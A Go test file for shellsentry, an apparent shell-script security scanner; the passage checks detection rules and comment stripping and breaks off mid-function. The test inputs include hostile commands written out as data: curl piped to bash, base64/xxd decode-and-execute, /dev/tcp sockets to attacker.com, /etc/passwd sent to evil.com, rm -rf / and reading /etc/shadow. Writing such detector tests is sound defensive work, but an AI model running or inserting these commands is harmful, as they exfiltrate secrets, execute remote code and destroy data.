// Package patterns provides pattern matching for shell script analysis.
//
// Copyright 2025 3 Leaps, LLC
// Licensed under the Apache License, Version 2.0

package patterns

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/3leaps/shellsentry/internal/parser"
	"github.com/3leaps/shellsentry/internal/types"
)

// Test pattern generators - these generate test input programmatically
// to avoid storing potentially dangerous patterns in source files.

// generateCurlPipeBash generates curl|bash patterns for testing.
func generateCurlPipeBash(url string, shell string) string {
	return fmt.Sprintf("curl -fsSL %s | %s", url, shell)
}

// generateWgetPipeShell generates wget piped to shell patterns.
func generateWgetPipeShell(url string, shell string) string {
	return fmt.Sprintf("wget -qO- %s | %s", url, shell)
}

// generateBase64Exec generates base64 decode + exec patterns.
func generateBase64Exec(payload string, shell string) string {
	return fmt.Sprintf("echo %s | base64 -d | %s", payload, shell)
}

// generateEvalVar generates eval with variable patterns.
func generateEvalVar(varName string) string {
	return fmt.Sprintf("eval \"$%s\"", varName)
}

// generateDevTcp generates /dev/tcp patterns.
func generateDevTcp(host string, port int) string {
	return fmt.Sprintf("exec 3<>/dev/tcp/%s/%d", host, port)
}

func TestBuiltinPatterns_Loaded(t *testing.T) {
	ps := BuiltinPatterns()

	if len(ps.Patterns) == 0 {
		t.Fatal("expected builtin patterns, got none")
	}

	// Verify we have patterns from all severity levels
	var high, medium, low, info int
	for _, p := range ps.Patterns {
		switch p.Severity {
		case types.SeverityHigh:
			high++
		case types.SeverityMedium:
			medium++
		case types.SeverityLow:
			low++
		case types.SeverityInfo:
			info++
		}
	}

	if high == 0 {
		t.Error("expected high-severity patterns")
	}
	if medium == 0 {
		t.Error("expected medium-severity patterns")
	}
	if low == 0 {
		t.Error("expected low-severity patterns")
	}
	if info == 0 {
		t.Error("expected info-severity patterns")
	}

	t.Logf("Loaded patterns: %d high, %d medium, %d low, %d info",
		high, medium, low, info)
}

func TestBuiltinPatterns_AllCompile(t *testing.T) {
	ps := BuiltinPatterns()

	for _, p := range ps.Patterns {
		// Patterns are compiled during BuiltinPatterns() via ps.Add()
		// but let's verify they work against test input
		if len(p.compiled) == 0 {
			t.Errorf("pattern %s has no compiled regexes", p.ID)
		}
	}
}

func TestPattern_SS001_CurlPipeBash(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantID  string
		wantHit bool
	}{
		{
			name:    "curl pipe bash",
			input:   generateCurlPipeBash("https://example.com/script.sh", "bash"),
			wantID:  "SS001",
			wantHit: true,
		},
		{
			name:    "curl pipe sh",
			input:   generateCurlPipeBash("https://example.com/script.sh", "sh"),
			wantID:  "SS001",
			wantHit: true,
		},
		{
			name:    "curl pipe zsh",
			input:   generateCurlPipeBash("https://example.com/script.sh", "zsh"),
			wantID:  "SS001",
			wantHit: true,
		},
		{
			name:    "wget pipe bash",
			input:   generateWgetPipeShell("https://example.com/script.sh", "bash"),
			wantID:  "SS001",
			wantHit: true,
		},
		{
			name:    "curl to file (safe)",
			input:   "curl -fsSL https://example.com/script.sh -o script.sh",
			wantID:  "SS001",
			wantHit: false,
		},
		{
			name:    "curl pipe grep (safe)",
			input:   "curl https://example.com/data.txt | grep pattern",
			wantID:  "SS001",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == tc.wantID {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Errorf("expected %s to match, but didn't", tc.wantID)
				} else {
					t.Errorf("expected %s NOT to match, but did", tc.wantID)
				}
			}
		})
	}
}

func TestPattern_SS002_Base64Exec(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "base64 decode pipe bash",
			input:   generateBase64Exec("dGVzdA==", "bash"),
			wantHit: true,
		},
		{
			name:    "base64 decode pipe sh",
			input:   generateBase64Exec("dGVzdA==", "sh"),
			wantHit: true,
		},
		{
			name:    "base64 decode pipe eval",
			input:   "base64 -d payload.txt | eval",
			wantHit: true,
		},
		{
			name:    "base64 encode (safe)",
			input:   "echo 'test' | base64",
			wantHit: false,
		},
		{
			name:    "base64 decode to file (safe)",
			input:   "base64 -d input.txt > output.bin",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS002" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS002 to match, but didn't")
				} else {
					t.Error("expected SS002 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS003_EvalVariable(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "eval double quoted var",
			input:   generateEvalVar("CMD"),
			wantHit: true,
		},
		{
			name:    "eval braced var",
			input:   "eval ${COMMAND}",
			wantHit: true,
		},
		{
			name:    "eval unquoted var",
			input:   "eval $user_input",
			wantHit: true,
		},
		{
			name:    "eval static string (safe)",
			input:   "eval 'echo hello'",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS003" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS003 to match, but didn't")
				} else {
					t.Error("expected SS003 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS004_DevTcp(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "dev tcp socket",
			input:   generateDevTcp("attacker.com", 4444),
			wantHit: true,
		},
		{
			name:    "dev udp socket",
			input:   "exec 3<>/dev/udp/192.168.1.1/53",
			wantHit: true,
		},
		{
			name:    "regular /dev device (safe)",
			input:   "cat /dev/null",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS004" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS004 to match, but didn't")
				} else {
					t.Error("expected SS004 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS006_RmRfRoot(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "rm -rf /",
			input:   "rm -rf / ",
			wantHit: true,
		},
		{
			name:    "rm -rf / in multiline script",
			input:   "echo hi\nrm -rf /\necho done\n",
			wantHit: true,
		},
		{
			name:    "rm -rf /*",
			input:   "rm -rf /*",
			wantHit: true,
		},
		{
			name:    "rm -rf with variable default",
			input:   `rm -rf "${DIR:-/}"`,
			wantHit: true,
		},
		{
			name:    "rm -rf safe path",
			input:   "rm -rf /tmp/build",
			wantHit: false,
		},
		{
			name:    "rm single file",
			input:   "rm /tmp/file.txt",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS006" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS006 to match, but didn't")
				} else {
					t.Error("expected SS006 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS007_Chmod777(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "chmod 777",
			input:   "chmod 777 /tmp/file",
			wantHit: true,
		},
		{
			name:    "chmod a+rwx",
			input:   "chmod a+rwx script.sh",
			wantHit: true,
		},
		{
			name:    "chmod 755 (safe)",
			input:   "chmod 755 script.sh",
			wantHit: false,
		},
		{
			name:    "chmod +x (safe)",
			input:   "chmod +x script.sh",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS007" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS007 to match, but didn't")
				} else {
					t.Error("expected SS007 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS008_HexDecodeExec(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "xxd reverse pipe bash",
			input:   "echo '63 75 72 6c' | xxd -r -p | bash",
			wantHit: true,
		},
		{
			name:    "xxd reverse to sh",
			input:   "xxd -r payload.hex | sh",
			wantHit: true,
		},
		{
			name:    "xxd reverse to eval",
			input:   "xxd -p -r < encoded.txt | eval",
			wantHit: true,
		},
		{
			name:    "xxd hex dump (safe)",
			input:   "xxd file.bin > hex.txt",
			wantHit: false,
		},
		{
			name:    "xxd reverse to file (safe)",
			input:   "xxd -r hex.txt > binary.out",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS008" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS008 to match, but didn't")
				} else {
					t.Error("expected SS008 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS009_ArithmeticExec(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "command in arithmetic expansion",
			input:   "$(($(cat /etc/passwd > /dev/tcp/evil.com/80)))",
			wantHit: true,
		},
		{
			name:    "nested command substitution in arithmetic",
			input:   "echo $((1 + $(curl http://evil.com)))",
			wantHit: true,
		},
		{
			name:    "simple arithmetic (safe)",
			input:   "echo $((1 + 2))",
			wantHit: false,
		},
		{
			name:    "arithmetic with variable (safe)",
			input:   "echo $((count + 1))",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS009" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS009 to match, but didn't")
				} else {
					t.Error("expected SS009 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS010_Sudo(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		// Actual sudo commands - should match
		{
			name:    "sudo command",
			input:   "sudo apt-get install package",
			wantHit: true,
		},
		{
			name:    "sudo with flags",
			input:   "sudo -E make install",
			wantHit: true,
		},
		{
			name:    "sudo with path",
			input:   "sudo /usr/bin/install",
			wantHit: true,
		},
		{
			name:    "sudo with relative path",
			input:   "sudo ./script.sh",
			wantHit: true,
		},
		{
			name:    "sudo with multiple flags",
			input:   "sudo -u root -E command",
			wantHit: true,
		},
		// Comments - should NOT match (stripped)
		{
			name:    "commented sudo (full-line comments stripped)",
			input:   "# sudo rm -rf /",
			wantHit: false,
		},
		{
			name:    "inline comment with sudo",
			input:   "echo hello # sudo rm -rf /",
			wantHit: false,
		},
		// Prose/strings - should NOT match (E005 fix)
		{
			name:    "sudo in prose - need sudo access",
			input:   `abort "Need sudo access on macOS"`,
			wantHit: false,
		},
		{
			name:    "sudo in prose - requires sudo",
			input:   `echo "This script requires sudo privileges"`,
			wantHit: false,
		},
		{
			name:    "sudo in prose - sudo prints",
			input:   `# sudo prints a warning message`,
			wantHit: false,
		},
		{
			name:    "sudo in variable name",
			input:   `SUDO_USER=root`,
			wantHit: false,
		},
		{
			name:    "sudo word in string",
			input:   `echo "the word sudo appears here"`,
			wantHit: false,
		},
		// Additional command contexts - should match
		{
			name:    "sudo after semicolon",
			input:   `cd /tmp; sudo make install`,
			wantHit: true,
		},
		{
			name:    "sudo after &&",
			input:   `test -f file && sudo rm file`,
			wantHit: true,
		},
		{
			name:    "sudo after ||",
			input:   `test -f file || sudo touch file`,
			wantHit: true,
		},
		{
			name:    "sudo in subshell",
			input:   `(sudo apt-get update)`,
			wantHit: true,
		},
		{
			name:    "sudo in command substitution",
			input:   `result=$(sudo cat /etc/shadow)`,
			wantHit: true,
		},
		{
			name:    "sudo after pipe",
			input:   `echo password | sudo -S command`,
			wantHit: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS010" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS010 to match, but didn't")
				} else {
					t.Error("expected SS010 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS012_PathModification(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "export PATH",
			input:   "export PATH=/usr/local/bin:$PATH",
			wantHit: true,
		},
		{
			name:    "PATH prepend",
			input:   "PATH=/opt/bin:$PATH",
			wantHit: true,
		},
		{
			name:    "PATH append",
			input:   "PATH=$PATH:/new/path",
			wantHit: true,
		},
		{
			name:    "other env var (safe)",
			input:   "export HOME=/home/user",
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS012" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS012 to match, but didn't")
				} else {
					t.Error("expected SS012 NOT to match, but did")
				}
			}
		})
	}
}

func TestPattern_SS020_NetworkDownload(t *testing.T) {
	ps := BuiltinPatterns()

	testCases := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "curl",
			input:   "curl https://example.com/file.tar.gz",
			wantHit: true,
		},
		{
			name:    "wget",
			input:   "wget https://example.com/file.tar.gz",
			wantHit: true,
		},
		// NOTE: Regex-based detection cannot distinguish string content from commands.
		// The pattern `curl\s+` matches "curl " anywhere, including in strings.
		// AST-based analysis would handle this correctly.
		{
			name:    "echo curl (known limitation: regex matches in strings)",
			input:   "echo 'use curl to download'",
			wantHit: true, // Regex can't distinguish string content
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches := ps.MatchAll([]byte(tc.input))

			var found bool
			for _, m := range matches {
				if m.Pattern.ID == "SS020" {
					found = true
					break
				}
			}

			if found != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS020 to match, but didn't")
				} else {
					t.Error("expected SS020 NOT to match, but did")
				}
			}
		})
	}
}

func TestPatternSet_MatchAll_MultiplePatterns(t *testing.T) {
	ps := BuiltinPatterns()

	// This script has multiple pattern matches
	script := `#!/bin/bash
curl https://example.com/install.sh | bash
sudo apt-get update
export PATH=/opt/bin:$PATH
`

	matches := ps.MatchAll([]byte(script))

	// Should match: SS001 (curl|bash), SS010 (sudo), SS012 (PATH), SS020 (curl), SS021 (apt)
	expectedIDs := map[string]bool{
		"SS001": false, // curl|bash
		"SS010": false, // sudo
		"SS012": false, // PATH modification
		"SS020": false, // network download (curl)
		"SS021": false, // package manager (apt)
	}

	for _, m := range matches {
		if _, ok := expectedIDs[m.Pattern.ID]; ok {
			expectedIDs[m.Pattern.ID] = true
		}
	}

	for id, found := range expectedIDs {
		if !found {
			t.Errorf("expected pattern %s to match", id)
		}
	}
}

func TestPattern_LineColumnPositions(t *testing.T) {
	ps := BuiltinPatterns()

	script := `#!/bin/bash
echo "hello"
curl https://example.com | bash
echo "done"
`

	matches := ps.MatchAll([]byte(script))

	// Find the SS001 match
	var curlMatch *Match
	for i := range matches {
		if matches[i].Pattern.ID == "SS001" {
			curlMatch = &matches[i]
			break
		}
	}

	if curlMatch == nil {
		t.Fatal("expected SS001 match")
	}

	// curl|bash is on line 3
	if curlMatch.Line != 3 {
		t.Errorf("expected line 3, got %d", curlMatch.Line)
	}

	// Should start at column 1 (curl is at start of line)
	if curlMatch.Column != 1 {
		t.Errorf("expected column 1, got %d", curlMatch.Column)
	}
}

func TestMatch_ToFinding(t *testing.T) {
	ps := BuiltinPatterns()

	script := generateCurlPipeBash("https://example.com/script.sh", "bash")
	matches := ps.MatchAll([]byte(script))

	if len(matches) == 0 {
		t.Fatal("expected matches")
	}

	// Find SS001 match
	var match Match
	for _, m := range matches {
		if m.Pattern.ID == "SS001" {
			match = m
			break
		}
	}

	finding := match.ToFinding()

	if finding.ID != "SS001" {
		t.Errorf("expected ID SS001, got %s", finding.ID)
	}
	if finding.Severity != types.SeverityHigh {
		t.Errorf("expected high severity, got %s", finding.Severity)
	}
	if finding.Category != types.CategoryExecution {
		t.Errorf("expected execution category, got %s", finding.Category)
	}
	if finding.Line != 1 {
		t.Errorf("expected line 1, got %d", finding.Line)
	}
	if finding.Message == "" {
		t.Error("expected non-empty message")
	}
	if finding.Recommendation == "" {
		t.Error("expected non-empty recommendation")
	}
}

func TestTruncateCode(t *testing.T) {
	testCases := []struct {
		input  string
		maxLen int
		want   string
	}{
		{"short", 10, "short"},
		{"exactly10!", 10, "exactly10!"},
		{"this is a longer string", 10, "this is..."},
		{"", 10, ""},
	}

	for _, tc := range testCases {
		got := truncateCode(tc.input, tc.maxLen)
		if got != tc.want {
			t.Errorf("truncateCode(%q, %d) = %q, want %q",
				tc.input, tc.maxLen, got, tc.want)
		}
	}
}

func TestPositionToLineCol(t *testing.T) {
	content := []byte("line1\nline2\nline3")

	testCases := []struct {
		pos      int
		wantLine int
		wantCol  int
	}{
		{0, 1, 1},            // Start of file
		{4, 1, 5},            // End of "line1"
		{5, 1, 6},            // The newline itself
		{6, 2, 1},            // Start of line 2
		{11, 2, 6},           // The newline after line2
		{12, 3, 1},           // Start of line 3
		{len(content), 3, 6}, // End of file
	}

	for _, tc := range testCases {
		line, col := positionToLineCol(content, tc.pos)
		if line != tc.wantLine || col != tc.wantCol {
			t.Errorf("positionToLineCol(content, %d) = (%d, %d), want (%d, %d)",
				tc.pos, line, col, tc.wantLine, tc.wantCol)
		}
	}
}

func TestPatternSet_Add_InvalidRegex(t *testing.T) {
	ps := NewPatternSet()

	badPattern := &Pattern{
		ID:       "BAD001",
		Name:     "bad-pattern",
		Severity: types.SeverityHigh,
		Category: types.CategoryExecution,
		Patterns: []PatternMatch{
			{Regex: "[invalid(regex"}, // Unclosed bracket
		},
	}

	err := ps.Add(badPattern)
	if err == nil {
		t.Error("expected error for invalid regex, got nil")
	}
}

func TestPatternSet_Empty(t *testing.T) {
	ps := NewPatternSet()

	matches := ps.MatchAll([]byte("any content"))
	if len(matches) != 0 {
		t.Errorf("expected 0 matches from empty pattern set, got %d", len(matches))
	}
}

func TestStripComments(t *testing.T) {
	testCases := []struct {
		name  string
		input string
		want  string
	}{
		// ============================================================
		// FULL-LINE COMMENTS
		// ============================================================
		{
			name:  "full-line comment",
			input: "# this is a comment",
			want:  "                   ",
		},
		{
			name:  "indented comment with spaces",
			input: "  # indented comment",
			want:  "                    ",
		},
		{
			name:  "indented comment with tab",
			input: "\t# tab comment",
			want:  "              ",
		},
		{
			name:  "indented comment mixed whitespace",
			input: " \t # mixed indent",
			want:  "                 ",
		},
		{
			name:  "shebang line",
			input: "#!/bin/bash",
			want:  "           ",
		},
		{
			name:  "shebang with env",
			input: "#!/usr/bin/env bash",
			want:  "                   ",
		},
		{
			name:  "comment only hash",
			input: "#",
			want:  " ",
		},
		{
			name:  "comment with leading spaces only hash",
			input: "   #",
			want:  "    ",
		},

		// ============================================================
		// INLINE COMMENTS - BASIC
		// ============================================================
		{
			name:  "inline comment simple",
			input: "echo hello # comment",
			want:  "echo hello          ",
		},
		{
			name:  "inline comment no space before hash",
			input: "echo hello# comment",
			want:  "echo hello         ",
		},
		{
			name:  "inline comment multiple spaces",
			input: "cmd arg1 arg2   # this is a comment",
			want:  "cmd arg1 arg2                      ",
		},
		{
			name:  "inline comment at end",
			input: "export PATH=/usr/bin #",
			want:  "export PATH=/usr/bin  ",
		},
		{
			name:  "command then long comment",
			input: "ls -la # list all files including hidden ones",
			want:  "ls -la                                       ",
		},

		// ============================================================
		// DOUBLE QUOTED STRINGS - hash should be preserved
		// ============================================================
		{
			name:  "hash in double quotes",
			input: `echo "foo#bar"`,
			want:  `echo "foo#bar"`,
		},
		{
			name:  "hash at start of double quoted string",
			input: `echo "#hashtag"`,
			want:  `echo "#hashtag"`,
		},
		{
			name:  "multiple hashes in double quotes",
			input: `echo "##foo##bar##"`,
			want:  `echo "##foo##bar##"`,
		},
		{
			name:  "hash in double quotes then real comment",
			input: `echo "foo#bar" # real comment`,
			want:  `echo "foo#bar"               `,
		},
		{
			name:  "empty double quoted string then comment",
			input: `echo "" # comment`,
			want:  `echo ""          `,
		},
		{
			name:  "double quotes with spaces and hash",
			input: `echo "hello # world"`,
			want:  `echo "hello # world"`,
		},
		{
			name:  "multiple double quoted strings with hashes",
			input: `echo "#one" "#two" "#three"`,
			want:  `echo "#one" "#two" "#three"`,
		},
		{
			name:  "double quoted string after comment would start",
			input: `cmd "#not a comment"`,
			want:  `cmd "#not a comment"`,
		},

		// ============================================================
		// SINGLE QUOTED STRINGS - hash should be preserved
		// ============================================================
		{
			name:  "hash in single quotes",
			input: `echo 'foo#bar'`,
			want:  `echo 'foo#bar'`,
		},
		{
			name:  "hash at start of single quoted string",
			input: `echo '#hashtag'`,
			want:  `echo '#hashtag'`,
		},
		{
			name:  "multiple hashes in single quotes",
			input: `echo '##foo##bar##'`,
			want:  `echo '##foo##bar##'`,
		},
		{
			name:  "hash in single quotes then real comment",
			input: `echo 'foo#bar' # real comment`,
			want:  `echo 'foo#bar'               `,
		},
		{
			name:  "single quotes with spaces and hash",
			input: `echo 'hello # world'`,
			want:  `echo 'hello # world'`,
		},

		// ============================================================
		// ESCAPED CHARACTERS
		// ============================================================
		{
			name:  "escaped hash outside quotes",
			input: `echo \# not a comment`,
			want:  `echo \# not a comment`,
		},
		{
			name:  "escaped hash then real comment",
			input: `echo \#foo # real comment`,
			want:  `echo \#foo               `,
		},
		{
			name:  "escaped double quote in string",
			input: `echo "foo\"#bar"`,
			want:  `echo "foo\"#bar"`,
		},
		{
			name:  "escaped backslash before hash in double quotes",
			input: `echo "foo\\#bar"`,
			want:  `echo "foo\\#bar"`,
		},
		{
			name:  "escaped single quote outside quotes",
			input: `echo it\'s # comment`,
			want:  `echo it\'s          `,
		},
		{
			name:  "multiple escapes",
			input: `echo \\ \# \\# # comment`,
			want:  `echo \\ \# \\           `, // \\# = escaped backslash then comment
		},
		{
			name:  "escape at end of line",
			input: `echo test \`,
			want:  `echo test \`,
		},

		// ============================================================
		// MIXED QUOTE TYPES
		// ============================================================
		{
			name:  "single inside double quotes with hash",
			input: `echo "it's a #test"`,
			want:  `echo "it's a #test"`,
		},
		{
			name:  "double inside single quotes with hash",
			input: `echo 'say "hello#world"'`,
			want:  `echo 'say "hello#world"'`,
		},
		{
			name:  "alternating quotes with hash",
			input: `echo "foo" '#bar' "baz#qux"`,
			want:  `echo "foo" '#bar' "baz#qux"`,
		},
		{
			name:  "alternating quotes then comment",
			input: `echo "foo" 'bar' # comment`,
			want:  `echo "foo" 'bar'          `,
		},

		// ============================================================
		// MULTILINE CONTENT
		// ============================================================
		{
			name:  "multiline with full-line comment",
			input: "echo hello\n# comment\necho world",
			want:  "echo hello\n         \necho world",
		},
		{
			name:  "multiline with inline comments",
			input: "echo one # first\necho two # second",
			want:  "echo one        \necho two         ",
		},
		{
			name:  "multiline mixed comment types",
			input: "#!/bin/bash\n# Full line\necho test # inline",
			want:  "           \n           \necho test         ",
		},
		{
			name:  "multiline with quotes spanning concept",
			input: "echo \"line1#hash\"\necho 'line2#hash'",
			want:  "echo \"line1#hash\"\necho 'line2#hash'",
		},

		// ============================================================
		// EDGE CASES
		// ============================================================
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "whitespace only",
			input: "   ",
			want:  "   ",
		},
		{
			name:  "no hash at all",
			input: "echo hello world",
			want:  "echo hello world",
		},
		{
			name:  "only whitespace before hash",
			input: "     # comment",
			want:  "              ",
		},
		{
			name:  "tab before hash",
			input: "\t# comment",
			want:  "          ",
		},
		{
			name:  "unclosed double quote",
			input: `echo "unclosed # hash`,
			want:  `echo "unclosed # hash`,
		},
		{
			name:  "unclosed single quote",
			input: `echo 'unclosed # hash`,
			want:  `echo 'unclosed # hash`,
		},
		{
			name:  "hash immediately after quote close",
			input: `echo "test"#comment`,
			want:  `echo "test"        `,
		},

		// ============================================================
		// REAL-WORLD PATTERNS (from dogfood)
		// ============================================================
		{
			name:  "homebrew style sudo reference",
			input: `ohai "This script requires sudo access" # warning`,
			want:  `ohai "This script requires sudo access"          `,
		},
		{
			name:  "curl in documentation comment",
			input: `# Use: curl https://example.com | bash`,
			want:  `                                      `,
		},
		{
			name:  "rm -rf in comment",
			input: `# DANGER: rm -rf / would delete everything`,
			want:  `                                          `,
		},
		{
			name:  "variable with hash in name pattern",
			input: `COLOR="#FF0000" # red color`,
			want:  `COLOR="#FF0000"            `,
		},
		{
			name:  "printf with format containing hash",
			input: `printf "%s#%s" "$a" "$b" # join with hash`,
			want:  `printf "%s#%s" "$a" "$b"                 `,
		},
		{
			name:  "sed with hash delimiter",
			input: `sed 's#/old#/new#g' file # using hash as delimiter`,
			want:  `sed 's#/old#/new#g' file                          `,
		},
		{
			name:  "awk with hash in pattern",
			input: `awk '/^#/{next}' file`,
			want:  `awk '/^#/{next}' file`,
		},
		{
			name:  "grep for comment lines",
			input: `grep '^#' file # find comments`,
			want:  `grep '^#' file                `,
		},

		// ============================================================
		// PARAMETER EXPANSION (common shell patterns)
		// ============================================================
		{
			name:  "parameter expansion with hash",
			input: `echo ${var#pattern}`,
			want:  `echo ${var#pattern}`,
		},
		{
			name:  "parameter expansion double hash",
			input: `echo ${var##pattern}`,
			want:  `echo ${var##pattern}`,
		},
		{
			name:  "parameter expansion then comment",
			input: `echo ${var#pattern} # strip prefix`,
			want:  `echo ${var#pattern}               `,
		},
		{
			name:  "length expansion",
			input: `echo ${#var} # length of var`,
			want:  `echo ${#var}                `,
		},

		// ============================================================
		// SPECIAL SHELL CONSTRUCTS
		// ============================================================
		{
			name:  "command substitution with hash",
			input: `result=$(echo "#test")`,
			want:  `result=$(echo "#test")`,
		},
		{
			name:  "backtick substitution with hash",
			input: "result=`echo \"#test\"`",
			want:  "result=`echo \"#test\"`",
		},
		{
			name:  "array with hash values",
			input: `arr=("#one" "#two")`,
			want:  `arr=("#one" "#two")`,
		},
		{
			name:  "regex pattern with hash - known limitation",
			input: `[[ $x =~ ^#.* ]] # check if comment`,
			want:  `[[ $x =~ ^                         `, // regex # outside quotes treated as comment
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			got := string(stripComments([]byte(tc.input)))
			if got != tc.want {
				t.Errorf("stripComments(%q) =\n  got:  %q\n  want: %q",
					tc.input, got, tc.want)
			}
			// Verify length preservation - critical for position accuracy
			if len(got) != len(tc.input) {
				t.Errorf("length changed: input %d bytes, output %d bytes",
					len(tc.input), len(got))
			}
		})
	}
}

// TestStripComments_LengthPreservation ensures byte positions are always preserved
func TestStripComments_LengthPreservation(t *testing.T) {
	inputs := []string{
		"",
		"#",
		"# comment",
		"echo hello",
		"echo hello # comment",
		`echo "foo#bar"`,
		`echo 'foo#bar'`,
		"line1\nline2\nline3",
		"#!/bin/bash\n# comment\necho test # inline\n",
		`echo "\"#\""`,
		`echo '\''`,
		"echo \\# test",
	}

	for _, input := range inputs {
		got := stripComments([]byte(input))
		if len(got) != len(input) {
			t.Errorf("length mismatch for %q: input=%d, output=%d",
				input, len(input), len(got))
		}
	}
}

// TestStripComments_NoFalseStripping ensures we don't strip things that look like comments but aren't
func TestStripComments_NoFalseStripping(t *testing.T) {
	// These inputs should be returned unchanged
	unchanged := []string{
		`echo "curl https://example.com | bash"`,
		`echo 'sudo rm -rf /'`,
		`grep '#include' file.c`,
		`sed 's/#.*$//'`,
		`awk '{print $1"#"$2}'`,
		`echo ${var#prefix}`,
		`echo ${var##prefix}`,
		`echo ${#array[@]}`,
		`COLOR="#FF0000"`,
		`printf "%s#%s\n" a b`,
	}

	for _, input := range unchanged {
		got := string(stripComments([]byte(input)))
		if got != input {
			t.Errorf("incorrectly modified: %q -> %q", input, got)
		}
	}
}

func TestCommentStripping_LineNumbers(t *testing.T) {
	ps := BuiltinPatterns()

	// Script with dangerous pattern on line 3, but line 2 is a comment
	script := `#!/bin/bash
# curl https://evil.com | bash
curl https://example.com | bash
echo "done"
`

	matches := ps.MatchAll([]byte(script))

	// Should find SS001 on line 3, not line 2
	var curlMatch *Match
	for i := range matches {
		if matches[i].Pattern.ID == "SS001" {
			curlMatch = &matches[i]
			break
		}
	}

	if curlMatch == nil {
		t.Fatal("expected SS001 match on line 3")
	}

	if curlMatch.Line != 3 {
		t.Errorf("expected match on line 3, got line %d", curlMatch.Line)
	}
}

func TestCommentStripping_HeredocProtectedLines(t *testing.T) {
	ps := BuiltinPatterns()

	script := `#!/bin/bash
cat <<EOF
# curl https://evil.com | bash
EOF
`

	parsed, err := parser.Parse([]byte(script), "test.sh", parser.DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	var protected []LineRange
	for _, r := range parser.FindHeredocs(parsed.File) {
		protected = append(protected, LineRange{StartLine: r.StartLine, EndLine: r.EndLine})
	}

